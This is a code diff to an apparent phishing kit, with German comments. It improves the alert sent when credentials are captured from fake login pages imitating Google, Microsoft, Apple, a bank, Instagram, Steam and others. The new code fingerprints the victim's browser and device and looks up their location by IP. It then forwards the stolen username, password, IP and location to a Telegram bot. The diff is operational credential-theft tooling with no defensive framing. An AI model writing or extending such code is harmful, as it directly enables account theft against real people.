@@ -46,27 +46,102 @@ _telegram_token: str = ""
 _telegram_chat_id: str = ""
 
 
+def _parse_ua(ua: str) -> tuple[str, str]:
+    """Erkennt Browser und Gerät aus User-Agent. Gibt (browser, device) zurück."""
+    ua = ua.lower()
+    if "edg/" in ua or "edge/" in ua:
+        browser = "Edge"
+    elif "chrome/" in ua and "chromium" not in ua:
+        browser = "Chrome"
+    elif "firefox/" in ua:
+        browser = "Firefox"
+    elif "safari/" in ua and "chrome" not in ua:
+        browser = "Safari"
+    elif "opera" in ua or "opr/" in ua:
+        browser = "Opera"
+    else:
+        browser = "Browser"
+
+    if any(x in ua for x in ("android", "iphone", "ipad", "mobile")):
+        if "android" in ua:
+            device = "Android"
+        elif "iphone" in ua:
+            device = "iPhone"
+        elif "ipad" in ua:
+            device = "iPad"
+        else:
+            device = "Mobile"
+    elif "windows" in ua:
+        device = "Windows"
+    elif "macintosh" in ua or "mac os" in ua:
+        device = "macOS"
+    elif "linux" in ua:
+        device = "Linux"
+    else:
+        device = "Unknown"
+
+    return browser, device
+
+
+def _get_country(ip: str) -> str:
+    """Schneller IP → Land Lookup (kein API-Key nötig)."""
+    if ip.startswith(("192.168.", "10.", "172.")):
+        return "LAN"
+    try:
+        with urllib.request.urlopen(
+            f"https://ipinfo.io/{ip}/json", timeout=4
+        ) as r:
+            data = json.loads(r.read())
+            city    = data.get("city", "")
+            country = data.get("country", "")
+            return f"{city}, {country}".strip(", ") or "?"
+    except Exception:
+        return "?"
+
+
 def _send_telegram_alert(entry: dict):
-    """Sendet sofortigen Telegram-Alert wenn Credentials erbeutet werden."""
+    """Sendet detaillierten Telegram-Alert wenn Credentials erbeutet werden."""
     if not _telegram_token or not _telegram_chat_id:
         return
     try:
+        ua = entry.get("user_agent", "")
+        browser, device = _parse_ua(ua)
+        location = _get_country(entry.get("ip", ""))
+        idx = len(_captured)
+
+        page_icons = {
+            "google": "🔵", "microsoft": "🟦", "instagram": "🟣",
+            "apple": "⚪", "bank": "🟢", "tiktok": "⬛",
+            "snapchat": "🟡", "discord": "🟣", "twitter": "🐦",
+            "whatsapp": "🟢", "steam": "🎮",
+            "bitb-google": "🔵", "bitb-microsoft": "🟦",
+        }
+        page = entry.get("page", "?")
+        icon = page_icons.get(page, "🎣")
+
         msg = (
-            f"🎣 *PHISHING TREFFER!*\n\n"
-            f"🌐 Seite: `{entry.get('page','?')}`\n"
-            f"📍 IP: `{entry.get('ip','?')}`\n"
-            f"👤 User: `{entry.get('username','?')}`\n"
-            f"🔑 Pass: `{entry.get('password','?')}`\n"
-            f"🕐 Zeit: `{entry.get('timestamp','?')[:19]}`"
+            f"💀 <b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
+            f"     🎯 <b>CREDENTIAL CAPTURED #{idx}</b>\n"
+            f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
+            f"{icon} <b>Seite:</b>    <code>{page.upper()}</code>\n"
+            f"📍 <b>IP:</b>       <code>{entry.get('ip','?')}</code>\n"
+            f"🌍 <b>Location:</b> <code>{location}</code>\n"
+            f"💻 <b>Device:</b>   <code>{browser} on {device}</code>\n\n"
+            f"👤 <b>Username:</b>\n"
+            f"<pre>{entry.get('username','?')}</pre>\n"
+            f"🔑 <b>Password:</b>\n"
+            f"<pre>{entry.get('password','?')}</pre>\n"
+            f"⏰ <b>Zeit:</b> <code>{entry.get('timestamp','?')[:19].replace('T',' ')}</code>"
         )
+
         payload = urllib.parse.urlencode({
             "chat_id": _telegram_chat_id,
             "text": msg,
-            "parse_mode": "Markdown",
+            "parse_mode": "HTML",
         }).encode()
         url = f"https://api.telegram.org/bot{_telegram_token}/sendMessage"
         req = urllib.request.Request(url, data=payload)
-        urllib.request.urlopen(req, timeout=5)
+        urllib.request.urlopen(req, timeout=8)
     except Exception:
         pass
 
